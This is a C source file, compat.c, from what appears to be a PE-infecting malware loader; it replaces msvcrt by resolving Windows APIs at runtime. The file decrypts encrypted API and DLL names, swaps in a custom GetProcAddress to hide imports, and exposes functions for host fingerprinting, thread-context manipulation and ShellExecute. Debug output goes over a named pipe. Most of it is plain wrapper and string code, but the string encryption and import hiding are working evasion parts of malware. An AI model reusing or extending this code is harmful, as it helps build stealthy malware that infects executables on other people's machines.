/*
 * Module:  compat.c
 * Author:  Toni <matzeton@googlemail.com>
 * Purpose: Basic msvcrt replacement.
 *          Initialise function pointers using GetProcAddress and Base address of kernel32.dll.
 */

#include "compat.h"
#include "crypt.h"
#include "crypt_strings.h"
#include "utils.h"
#ifndef _DISABLE_MYGETPROC
#include "pe_infect.h"
#endif


/* HEAP Functions */
typedef HANDLE (WINAPI *HeapCreateFunc)     (DWORD, SIZE_T, SIZE_T);
typedef LPVOID (WINAPI *HeapAllocFunc)      (HANDLE, DWORD, SIZE_T);
typedef LPVOID (WINAPI *HeapReAllocFunc)    (HANDLE, DWORD, LPVOID, SIZE_T);
typedef BOOL   (WINAPI *HeapFreeFunc)       (HANDLE, DWORD, LPVOID);

/* MEMORY Functions */
typedef BOOL   (WINAPI *VirtualFreeFunc)    (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef void   (WINAPI *MoveMemoryFunc)     (PVOID, const void*, SIZE_T);
typedef void   (WINAPI *FillMemoryFunc)     (PVOID, SIZE_T, BYTE);
typedef BOOL   (WINAPI *IsBadReadPtrFunc)   (const void*,UINT_PTR);

/* STDIO Functions */
typedef BOOL   (WINAPI *WaitNamedPipeFunc)  (LPCTSTR, DWORD);
typedef BOOL   (WINAPI *AllocConsoleFunc)   (void);
typedef BOOL   (WINAPI *AttachConsoleFunc)  (DWORD);
typedef BOOL   (WINAPI *FreeConsoleFunc)    (void);
typedef BOOL   (WINAPI *WriteConsoleFunc)   (HANDLE, const void*, DWORD, LPDWORD, LPVOID);
typedef HANDLE (WINAPI *GetStdHandleFunc)   (DWORD);
typedef int    (WINAPI *MultiByteToWideCharFunc)(UINT, DWORD, LPCSTR, int, LPWSTR, int);

/* FILE I/O Functions */
typedef BOOL   (WINAPI *CloseHandleFunc)    (HANDLE);
typedef HANDLE (WINAPI *CreateFileFunc)     (LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD  (WINAPI *GetFileSizeFunc)    (HANDLE, LPDWORD);
typedef BOOL   (WINAPI *ReadFileFunc)       (HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *WriteFileFunc)      (HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD  (WINAPI *SetFilePointerFunc) (HANDLE, LONG, PLONG, DWORD);

/* other */
typedef DWORD  (WINAPI *GetCurrentProcessIdFunc) (void);
typedef void   (WINAPI *GetSystemTimeFunc)  (LPSYSTEMTIME);
typedef DWORD  (WINAPI *GetModuleFileNameFunc) (HMODULE, LPTSTR, DWORD);
typedef DWORD  (WINAPI *GetLastErrorFunc)   (void);
typedef void   (WINAPI *SetLastErrorFunc)   (DWORD);
typedef void   (WINAPI *OutputDebugStringFunc) (LPCTSTR);
typedef DWORD  (WINAPI *GetLogicalDriveStringsFunc) (DWORD, LPTSTR);
typedef UINT   (WINAPI *GetDriveTypeFunc)   (LPCTSTR);
typedef BOOL   (WINAPI *GetDiskFreeSpaceFunc) (LPCTSTR, LPDWORD, LPDWORD, LPDWORD, LPDWORD);
typedef DWORD  (WINAPI *GetTempPathFunc)    (DWORD, LPTSTR);

/* Thread/IPC */
typedef HANDLE (WINAPI *CreateThreadFunc)   (LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *ResumeThreadFunc)   (HANDLE);
typedef BOOL   (WINAPI *GetThreadContextFunc) (HANDLE, LPCONTEXT);
typedef BOOL   (WINAPI *SetThreadContextFunc) (HANDLE, const CONTEXT *);
typedef HANDLE (WINAPI *GetCurrentThreadFunc) (void);
typedef DWORD  (WINAPI *WaitForSingleObjectFunc) (HANDLE, DWORD);
typedef BOOL   (WINAPI *SwitchToThreadFunc) (void);

/* information gathering */
typedef DWORD  (WINAPI *GetVersionFunc)     (void);
typedef LPTSTR (WINAPI *GetCommandLineFunc) (void);
typedef void   (WINAPI *GetSystemInfoFunc)  (LPSYSTEM_INFO);
typedef BOOL   (WINAPI *GetVolumeInformationFunc) (LPCTSTR, LPTSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPTSTR, DWORD);
typedef BOOL   (WINAPI *GetCurrentHwProfileFunc) (LPHW_PROFILE_INFOA);
typedef UINT   (WINAPI *GetSystemDirectoryFunc) (LPTSTR, UINT);
typedef DWORD  (WINAPI *GetCurrentDirectoryFunc) (DWORD, LPTSTR);
typedef DWORD  (WINAPI *GetFileAttributesFunc) (LPCTSTR);

/* kernel functions */
typedef BOOL   (WINAPI *EnumDeviceDriversFunc) (LPVOID *, DWORD, LPDWORD);
typedef DWORD  (WINAPI *GetDeviceDriverBaseNameAFunc)(LPVOID, LPSTR, DWORD);

/* shell execute */
typedef HINSTANCE
               (WINAPI *ShellExecuteFunc)   (HWND, LPCTSTR, LPCTSTR, LPCTSTR, LPCTSTR, INT);


/* the very important handle to the KERNEL32.DLL ( got from the loader) */
static HMODULE kernel32;
/* GetProcAddress function pointer (got from the loader too) */
static GetProcAddressFunc getProcAdr;
/* Handle to private Heap */
static HANDLE heap = NULL;
#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
static HANDLE hOut    = NULL;
#ifdef _USE_PIPES
static char* pipeName = NULL;
#endif
#endif


static ApiCall_t* WinApi = NULL;
#define FUNC(i)                (WinApi[i].func_ptr)
#define RUN_FUNC(i, type, ...) ((type)WinApi[i].func_ptr)(__VA_ARGS__)


#define DECRYPT_AND_LOADLIB(i, dest)         { DBUF(i, tmp); dest = ((LoadLibraryFunc)WinApi[FUNC_LOADLIBRARYA_ENUM].func_ptr)((LPCSTR)tmp); }
#define DECRYPT_AND_LIBGETPROC(i, lib, dest) { DBUF(i, tmp); dest = getProcAdr(lib, tmp); }
#define DECRYPT_AND_GETPROC(i, dest)         DECRYPT_AND_LIBGETPROC(i, kernel32, dest)
#define DECRYPT_AND_GETPROCF(i)              DECRYPT_AND_LIBGETPROC(i, kernel32, FUNC(i))


/* initialize my tiny msvcrt replacement */
BOOL bInitCompat(void* __kernel32, void* __getProcAdr)
{
    if (WinApi)
        return TRUE;

    kernel32           = (HANDLE) __kernel32;
    getProcAdr         = (GetProcAddressFunc) __getProcAdr;
    void* __HeapCreate = NULL;
    void* __HeapAlloc  = NULL;

#ifndef _DISABLE_MYGETPROC
    BOOL bMyGetProcWorks = TRUE;
    {
        DBUF(FUNC_HEAPCREATE_ENUM, tmp);
        void* funcPtr1 = getProcAdr(kernel32, tmp);
        void* funcPtr2 = fnMyGetProcAddress(kernel32, tmp);
        __HeapCreate = funcPtr1;
        if (funcPtr1 != funcPtr2)
            bMyGetProcWorks = FALSE;
    }
#else
    DECRYPT_AND_GETPROC(FUNC_HEAPCREATE_ENUM, __HeapCreate);
#endif
#ifndef _DISABLE_MYGETPROC
    {
        DBUF(FUNC_HEAPALLOC_ENUM, tmp);
        void* funcPtr1 = getProcAdr(kernel32, tmp);
        void* funcPtr2 = fnMyGetProcAddress(kernel32, tmp);
        __HeapAlloc = funcPtr1;
        if (funcPtr1 != funcPtr2)
            bMyGetProcWorks = FALSE;
    }
    if (bMyGetProcWorks)
        getProcAdr = fnMyGetProcAddress;
#else
    DECRYPT_AND_GETPROC(FUNC_HEAPALLOC_ENUM,  __HeapAlloc);
#endif
    heap = ((HeapCreateFunc)__HeapCreate)(0, 65535, 0);
    if (!heap)
        return FALSE;

    /* alloc memory for function pointer */
    WinApi        = ((HeapAllocFunc)__HeapAlloc)(heap, HEAP_ZERO_MEMORY, sizeof(struct ApiCall)*(XOR_ENDFUNCS-XOR_STARTFUNCS + XOR_ENDFUNCS_OTHER-XOR_ENDFUNCS));
    if (!WinApi)
        return FALSE;

    FUNC(FUNC_HEAPCREATE_ENUM) = __HeapCreate;
    FUNC(FUNC_HEAPALLOC_ENUM)  = __HeapAlloc;
    BOOL ret = TRUE;
    for (unsigned i = XOR_STARTFUNCS+1; i < XOR_ENDFUNCS; ++i) {
        if (FUNC(i))
            continue;
        DECRYPT_AND_GETPROCF(i);
        if (!FUNC(i))
            ret = FALSE;
    }

    {
        HMODULE infoDLL;
        DECRYPT_AND_LOADLIB(INFODLL_ENUM, infoDLL);
        if (infoDLL)
            DECRYPT_AND_LIBGETPROC(INFO_GETCURHWPROFILE_ENUM, infoDLL, FUNC(INFO_GETCURHWPROFILE_ENUM));
        if (!FUNC(INFO_GETCURHWPROFILE_ENUM))
            ret = FALSE;
    }
    {
        HMODULE shellDLL;
        DECRYPT_AND_LOADLIB(SHELLDLL_ENUM, shellDLL);
        if (shellDLL)
            DECRYPT_AND_LIBGETPROC(SHELL_EXECUTE_ENUM, shellDLL, FUNC(SHELL_EXECUTE_ENUM));
        if (!FUNC(SHELL_EXECUTE_ENUM))
            ret = FALSE;
    }

#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
#ifdef _USE_PIPES
    {
        DBUF(MILLER_MSGPIPE_ENUM, tmp);
        pipeName = COMPAT(strdup)(tmp);
    }

    while (FUNC(FUNC_WAITNAMEDPIPE_ENUM) &&
           FUNC(FUNC_CREATEFILEA_ENUM)   &&
           FUNC(FUNC_GETLASTERROR_ENUM)) {
        hOut = RUN_FUNC(FUNC_CREATEFILEA_ENUM, CreateFileFunc, pipeName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

        if (hOut != INVALID_HANDLE_VALUE)
            break;
        if (RUN_FUNC(FUNC_GETLASTERROR_ENUM, GetLastErrorFunc) != ERROR_PIPE_BUSY)
            break;
        if (!RUN_FUNC(FUNC_WAITNAMEDPIPE_ENUM, WaitNamedPipeFunc, pipeName, 500))
            break;
    }
#else
    if (  FUNC(FUNC_ALLOCCONSOLE_ENUM)  &&
          FUNC(FUNC_FREECONSOLE_ENUM)   &&
          FUNC(FUNC_WRITECONSOLEA_ENUM) &&
          FUNC(FUNC_GETSTDHANDLE_ENUM)  &&
          FUNC(FUNC_ATTACHCONSOLE_ENUM) &&
          FUNC(FUNC_GETCURRENTPROCESSID_ENUM)  ) {
        RUN_FUNC(FUNC_ALLOCCONSOLE_ENUM, AllocConsoleFunc);
        hOut = RUN_FUNC(FUNC_GETSTDHANDLE_ENUM, GetStdHandleFunc, (DWORD)-11);

        if (hOut == INVALID_HANDLE_VALUE) {
            if (! RUN_FUNC(FUNC_ATTACHCONSOLE_ENUM, AttachConsoleFunc,
                      RUN_FUNC(FUNC_GETCURRENTPROCESSID_ENUM, GetCurrentProcessIdFunc)) ) {
                ret = FALSE;
            }
        }
    } else ret = FALSE;

    if (ret)
        COMPAT(puts)("bInitCompat SUCCESS!\n");
#endif
#endif

    return ret;
}


#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
#ifdef _USE_PIPES
BOOL _WriteConsole(const void* buffer, DWORD size, LPDWORD written)
{
    return RUN_FUNC(FUNC_WRITEFILE_ENUM, WriteFileFunc, hOut, buffer, size, written, NULL);
}
#else
HANDLE _GetStdout(void)
{
    return hOut;
}
BOOL _WriteConsole(const void* buffer, DWORD size, LPDWORD written)
{
    return RUN_FUNC(FUNC_WRITECONSOLEA_ENUM, WriteConsoleFunc, _GetStdout(), buffer, size, written, NULL);
}
#endif
#endif

inline void* COMPAT(calloc) (size_t nElements, size_t szElement)
{
    return RUN_FUNC(FUNC_HEAPALLOC_ENUM, HeapAllocFunc, heap, HEAP_ZERO_MEMORY, nElements*szElement);
}

inline void* COMPAT(realloc) (void* ptr, size_t szNew)
{
    return RUN_FUNC(FUNC_HEAPREALLOC_ENUM, HeapReAllocFunc, heap, HEAP_ZERO_MEMORY, ptr, szNew);
}

inline void COMPAT(free) (void* ptr)
{
    if (!ptr)
        return;
    RUN_FUNC(FUNC_HEAPFREE_ENUM, HeapFreeFunc, heap, 0, ptr);
}

const void* COMPAT(memmem) (const void* haystack, size_t haystacklen, const void* needle, size_t needlelen)
{
    if (!haystack || !needle || !haystacklen || !needlelen)
        return NULL;

    register const unsigned char* npos = needle;
    register const unsigned char* hpos = haystack;
    size_t hpos_off;
    size_t npos_off;
    do {
        if (*(unsigned char*)(npos) == *(unsigned char*)(hpos)) {
            npos++;
        } else npos = needle;
        hpos++;
        hpos_off = hpos - (unsigned char*)haystack;
        npos_off = npos - (unsigned char*)needle;
    } while (hpos_off < haystacklen && npos_off < needlelen);

    if (npos < (unsigned char*)(needle + needlelen))
        return NULL;
    return hpos - needlelen;
}

void* COMPAT(memcpy)(void* dst, void const* src, size_t len)
{
    long* plDst = (long*) dst;
    long const* plSrc = (long const*) src;

    if (!((long)plSrc & 0xFFFFFFFC) && !((long)plDst & 0xFFFFFFFC)) {
        while (len >= sizeof(long*)) {
            *plDst++ = *plSrc++;
            len -= sizeof(long*);
        }
    }

    char* pcDst = (char*) plDst;
    char const* pcSrc = (char const*) plSrc;

    while (len--) {
        *pcDst++ = *pcSrc++;
    }

    return dst;
}

inline void* COMPAT(memmove) (void* dst, const void* src, size_t siz)
{
    RUN_FUNC(FUNC_MOVEMEMORY_ENUM, MoveMemoryFunc, dst, src, siz);
    return dst;
}

inline void* COMPAT(memset) (void* str, int c, size_t siz)
{
    RUN_FUNC(FUNC_FILLMEMORY_ENUM, FillMemoryFunc, str, siz, c);
    return str;
}

#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
int COMPAT(puts) (const char* str)
{
    DWORD nmb = 0;
    if (_WriteConsole(str, COMPAT(strlen)(str), &nmb) != TRUE) {
        nmb = -1;
    }
    return nmb;
}
#endif

/* minimal implementation, not compatible with libc's and not as fast as libc's */
int COMPAT(strcmp) (const char* str1, const char* str2)
{
    int pos = 0;
    int fnd = 1;

    while ( str1[pos] != '\0' && str2[pos] != '\0' )
    {
        if (str1[pos] != str2[pos]) fnd = 0;
        ++pos;
    }
    if (!fnd)
    {
        if (str1[pos] == '\0')
        {
            fnd = 1;
        }
        else
        {
            fnd = -1;
        }
    }
    return fnd;
}

int COMPAT(strncmp) (const char* str1, const char* str2, size_t maxCount)
{
    size_t pos = 0;
    int fnd = 1;

    while ( pos < maxCount && str1[pos] != '\0' && str2[pos] != '\0' )
    {
        if (str1[pos] != str2[pos]) fnd = 0;
        ++pos;
    }
    if (!fnd)
    {
        if (str1[pos] == '\0')
        {
            fnd = 1;
        }
        else
        {
            fnd = -1;
        }
    } else return 0;
    return fnd;
}

static inline char __toLower(char c)
{
    if (c >= 0x41 && c <= 0x5A)
    {
        c += 32;
    }
    return c;
}

int COMPAT(strnicmp) (const char* str1, const char* str2, size_t maxCount)
{
    register size_t pos = 0;
    int fnd = 1;

    while ( pos < maxCount && str1[pos] != '\0' && str2[pos] != '\0' )
    {
        if (__toLower(str1[pos]) != __toLower(str2[pos])) fnd = 0;
        ++pos;
    }
    if (!fnd)
    {
        if (str1[pos] == '\0')
        {
            fnd = 1;
        } else {
            fnd = -1;
        }
    } else return 0;
    return fnd;
}

const char* COMPAT(strnstr) (const char* haystack, const char* needle, size_t maxCount)
{
    if (!haystack || !needle || !maxCount || *needle == '\0' || *haystack == '\0')
        return NULL;

    register const char* pos = needle;
    do {
        if (*pos == *haystack) {
            pos++;
        } else pos = needle;
    } while (*haystack++ != '\0' && *pos != '\0' && --maxCount > 0);
    if (pos == needle || *pos != '\0')
        return NULL;
    return haystack - (pos - needle);
}

const char* COMPAT(strnistr) (const char* haystack, const char* needle, size_t maxCount)
{
    if (!haystack || !needle || !maxCount || *needle == '\0' || *haystack == '\0')
        return NULL;

    register const char* pos = needle;
    do {
        if (__toLower(*pos) == __toLower(*haystack)) {
            pos++;
        } else pos = needle;
    } while (*haystack++ != '\0' && *pos != '\0' && --maxCount > 0);
    if (pos == needle || *pos != '\0')
        return NULL;
    return haystack - (pos - needle);
}

size_t COMPAT(strlen) (const char* str)
{
    register char* start = (char*) str;
    while (*str != '\0')
    {
        str++;
    }
    return str-start;
}

size_t COMPAT(strnlen) (const char* str, size_t maxCount)
{
    size_t len = 0;
    while (*str != '\0' && ++len != maxCount)
    {
        str++;
    }
    return len;
}

char* COMPAT(strdup) (const char* str)
{
    size_t len = COMPAT(strlen)(str);
    char *cpy = COMPAT(calloc)(len+1, sizeof(char));
    COMPAT(memcpy(cpy, str, len));
    return cpy;
}

char* COMPAT(strchr) (const char* str, int c)
{
    register char* tmp = (char*)str;
    while ( *(tmp) != '\0' )
    {
        if (*tmp == c) return tmp;
        tmp++;
    }
    return NULL;
}

inline char* COMPAT(strcat) (char *dest, const char *src)
{
    int dlen = COMPAT(strlen)(dest);
    int slen = COMPAT(strlen)(src);
    COMPAT(memcpy) ((char*)dest+dlen, src, slen);
    return dest;
}

#include "snprintf.h"

inline int COMPAT(vsnprintf) (char* buffer, unsigned int buffer_len, const char *fmt, va_list va)
{
    return mini_vsnprintf(buffer, buffer_len, fmt, va);
}

inline int COMPAT(snprintf) (char* buffer, unsigned int buffer_len, const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    int ret = mini_vsnprintf(buffer, buffer_len, fmt, ap);
    va_end(ap);
    return ret;
}

#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
int COMPAT(vprintf) (const char* format, va_list ap)
{
    char* out = COMPAT(calloc)(PRINT_BUFSIZ, sizeof(char));
    int ret = mini_vsnprintf(out, PRINT_BUFSIZ, format, ap);

    if (ret <= 0) {
        ret = -2;
        goto error;
    }
    size_t len = (ret < PRINT_BUFSIZ ? ret : PRINT_BUFSIZ-1);
    DWORD outBytes = 0;

    if (!_WriteConsole((const void*)out, len, &outBytes)) {
        ret = -3;
        goto error;
    }
    if (len != outBytes) {
        ret = -4;
        goto error;
    }

error:
    COMPAT(free)(out);
    return ret;
}

int COMPAT(printf)  (const char* format, ...)
{
    va_list args;
    va_start(args, format);
    int ret = COMPAT(vprintf)(format, args);
    va_end(args);
    return ret;
}
#endif

LPWSTR COMPAT(toWideChar)(LPCSTR mbStr, int mbLen, int* pOutLen)
{
    int siz = RUN_FUNC(FUNC_MULTIBYTETOWCHAR_ENUM, MultiByteToWideCharFunc, CP_UTF8, 0, mbStr, mbLen, NULL, 0);

    if (siz > 0) {
        LPWSTR out = COMPAT(calloc)(siz+1, sizeof(WCHAR));
        int ret = RUN_FUNC(FUNC_MULTIBYTETOWCHAR_ENUM, MultiByteToWideCharFunc, CP_UTF8, 0, mbStr, mbLen, out, siz);

        if (ret == 0) {
            COMPAT(free)(out);
        } else {
            if (pOutLen)
                *pOutLen = ret;
            return out;
        }
    }
    return NULL;
}

BOOL WINAPI _VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
{
    return RUN_FUNC(FUNC_VIRTUALFREE_ENUM, VirtualFreeFunc, lpAddress, dwSize, dwFreeType);
}

HMODULE WINAPI _LoadLibrary(LPCTSTR name)
{
    return RUN_FUNC(FUNC_LOADLIBRARYA_ENUM, LoadLibraryFunc, name);
}

FARPROC WINAPI _GetProcAddress(HMODULE hModule, LPCSTR szProcName)
{
    return getProcAdr(hModule, szProcName);
}

DWORD WINAPI _GetFileSize(HANDLE  hFile, LPDWORD lpFileSizeHigh)
{
    return RUN_FUNC(FUNC_GETFILESIZE_ENUM, GetFileSizeFunc, hFile, lpFileSizeHigh);
}

HANDLE WINAPI _CreateFile(LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
                          LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
                          DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
    return RUN_FUNC(FUNC_CREATEFILEA_ENUM, CreateFileFunc,
                        lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
                        dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

BOOL WINAPI _CloseHandle(HANDLE hObject)
{
    return RUN_FUNC(FUNC_CLOSEHANDLE_ENUM, CloseHandleFunc, hObject);
}

BOOL WINAPI _ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead,
                      LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
{
    return RUN_FUNC(FUNC_READFILE_ENUM, ReadFileFunc,
                        hFile, lpBuffer, nNumberOfBytesToRead,
                        lpNumberOfBytesRead, lpOverlapped);
}

BOOL WINAPI _WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,
                       LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
{
    return RUN_FUNC(FUNC_WRITEFILE_ENUM, WriteFileFunc,
                        hFile, lpBuffer, nNumberOfBytesToWrite,
                        lpNumberOfBytesWritten, lpOverlapped);
}

DWORD WINAPI _SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
{
    return RUN_FUNC(FUNC_SETFILEPOINTER_ENUM, SetFilePointerFunc,
                        hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);
}

BOOL WINAPI _IsBadReadPtr(const void* lp, UINT_PTR ucb)
{
    return RUN_FUNC(FUNC_ISBADREADPTR_ENUM, IsBadReadPtrFunc, lp, ucb);
}

void WINAPI _GetSystemTime(LPSYSTEMTIME lpSystemTime)
{
    return RUN_FUNC(FUNC_GETSYSTEMTIME_ENUM, GetSystemTimeFunc, lpSystemTime);
}

DWORD WINAPI _GetModuleFileName(HMODULE hModule, LPTSTR lpFilename, DWORD nSize)
{
    return RUN_FUNC(FUNC_GETMODULEFILENAMEA_ENUM, GetModuleFileNameFunc,
                        hModule, lpFilename, nSize);
}

DWORD WINAPI _GetLastError(void)
{
    return RUN_FUNC(FUNC_GETLASTERROR_ENUM, GetLastErrorFunc);
}

void WINAPI _SetLastError(DWORD dwErrCode)
{
    RUN_FUNC(FUNC_SETLASTERROR_ENUM, SetLastErrorFunc, dwErrCode);
}

void WINAPI _OutputDebugString(LPCTSTR lpcOut)
{
    RUN_FUNC(FUNC_OUTPUTDEBUGSTRING_ENUM, OutputDebugStringFunc, lpcOut);
}

DWORD WINAPI _GetLogicalDriveStrings(DWORD nBufferLength, LPTSTR lpBuffer)
{
    return RUN_FUNC(FUNC_GETLOGICALDRIVES_ENUM, GetLogicalDriveStringsFunc,
                        nBufferLength, lpBuffer);
}

UINT WINAPI _GetDriveType(LPCTSTR lpRootPathName)
{
    return RUN_FUNC(FUNC_GETDRIVETYPE_ENUM, GetDriveTypeFunc, lpRootPathName);
}

BOOL WINAPI _GetDiskFreeSpace(LPCTSTR lpRootPathName, LPDWORD lpSectorsPerCluster, LPDWORD lpBytesPerSector,
                              LPDWORD lpNumberOfFreeClusters, LPDWORD lpTotalNumberOfClusters)
{
    return RUN_FUNC(FUNC_GETDISKFREESPACE_ENUM, GetDiskFreeSpaceFunc,
                        lpRootPathName, lpSectorsPerCluster, lpBytesPerSector,
                        lpNumberOfFreeClusters, lpTotalNumberOfClusters);
}

DWORD WINAPI _GetTempPath(DWORD nBufferLength, LPTSTR lpBuffer)
{
    return RUN_FUNC(FUNC_GETTEMPPATH_ENUM, GetTempPathFunc, nBufferLength, lpBuffer);
}

HANDLE WINAPI _CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
                            LPTHREAD_START_ROUTINE lpStartAddress,
                            LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
{
    return RUN_FUNC(FUNC_CREATETHREAD_ENUM, CreateThreadFunc,
                        lpThreadAttributes, dwStackSize, lpStartAddress,
                        lpParameter, dwCreationFlags, lpThreadId);
}

DWORD WINAPI _ResumeThread(HANDLE hThread)
{
    return RUN_FUNC(FUNC_RESUMETHREAD_ENUM, ResumeThreadFunc, hThread);
}

BOOL WINAPI _GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
{
    return RUN_FUNC(FUNC_GETTHREADCTX_ENUM, GetThreadContextFunc, hThread, lpContext);
}

BOOL WINAPI _SetThreadContext(HANDLE hThread, const CONTEXT *lpContext)
{
    return RUN_FUNC(FUNC_SETTHREADCTX_ENUM, SetThreadContextFunc, hThread, lpContext);
}

HANDLE WINAPI _GetCurrentThread(void)
{
    return RUN_FUNC(FUNC_GETCURRENTTHREAD_ENUM, GetCurrentThreadFunc);
}

DWORD WINAPI _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
{
    return RUN_FUNC(FUNC_WAITSINGLEOBJ_ENUM, WaitForSingleObjectFunc, hHandle, dwMilliseconds);
}

BOOL WINAPI _SwitchToThread(void)
{
    return RUN_FUNC(FUNC_SWITCHTOTHREAD_ENUM, SwitchToThreadFunc);
}

DWORD WINAPI _GetVersion(void)
{
    return RUN_FUNC(INFO_GETVERSION_ENUM, GetVersionFunc);
}

LPTSTR WINAPI _GetCommandLine(void)
{
    return RUN_FUNC(INFO_GETCMDLINE_ENUM, GetCommandLineFunc);
}

void WINAPI _GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)
{
    return RUN_FUNC(INFO_GETSYSTEMINFO_ENUM, GetSystemInfoFunc, lpSystemInfo);
}

BOOL WINAPI _GetVolumeInformation(LPCTSTR lpRootPathName, LPTSTR lpVolumeNameBuffer, DWORD nVolumeNameSize,
                                  LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength,
                                  LPDWORD lpFileSystemFlags, LPTSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize)
{
    return RUN_FUNC(INFO_GETVOLINFO_ENUM, GetVolumeInformationFunc,
                        lpRootPathName, lpVolumeNameBuffer, nVolumeNameSize,
                        lpVolumeSerialNumber, lpMaximumComponentLength,
                        lpFileSystemFlags, lpFileSystemNameBuffer, nFileSystemNameSize);
}

BOOL WINAPI _GetCurrentHwProfile(LPHW_PROFILE_INFOA lpHwProfileInfo)
{
    if (!FUNC(INFO_GETCURHWPROFILE_ENUM))
        return FALSE;
    return RUN_FUNC(INFO_GETCURHWPROFILE_ENUM, GetCurrentHwProfileFunc, lpHwProfileInfo);
}

UINT WINAPI _GetSystemDirectory(LPTSTR lpBuffer, UINT uSize)
{
    return RUN_FUNC(INFO_GETSYSDIR_ENUM, GetSystemDirectoryFunc, lpBuffer, uSize);
}

UINT WINAPI _GetSystemWow64Directory(LPTSTR lpBuffer, UINT uSize)
{
    return RUN_FUNC(INFO_GETSYSWOW64DIR_ENUM, GetSystemDirectoryFunc, lpBuffer, uSize);
}

DWORD WINAPI _GetCurrentDirectory(DWORD nBufferLength, LPTSTR lpBuffer)
{
    return RUN_FUNC(INFO_GETCURDIR_ENUM, GetCurrentDirectoryFunc, nBufferLength, lpBuffer);
}

DWORD WINAPI _GetFileAttributes(LPCTSTR lpFileName)
{
    return RUN_FUNC(INFO_GETFILEATTRS_ENUM, GetFileAttributesFunc, lpFileName);
}

BOOL WINAPI _EnumDeviceDrivers(LPVOID *lpImageBase, DWORD cb, LPDWORD lpcbNeeded)
{
    return RUN_FUNC(KRNL_ENUMDEVICEDRIVERS_ENUM, EnumDeviceDriversFunc, lpImageBase, cb, lpcbNeeded);
}

DWORD WINAPI _GetDeviceDriverBaseNameA(LPVOID ImageBase, LPSTR lpBaseName, DWORD nSize)
{
    return RUN_FUNC(KRNL_GETDEVICEDRIVERBN_ENUM, GetDeviceDriverBaseNameAFunc, ImageBase, lpBaseName, nSize);
}

HINSTANCE _ShellExecute(HWND hwnd, LPCTSTR lpOperation, LPCTSTR lpFile, LPCTSTR lpParameters,
                        LPCTSTR lpDirectory, INT nShowCmd)
{
    if (!FUNC(SHELL_EXECUTE_ENUM))
        return NULL;
    return RUN_FUNC(SHELL_EXECUTE_ENUM, ShellExecuteFunc,
                         hwnd, lpOperation, lpFile, lpParameters,
                         lpDirectory, nShowCmd);
}
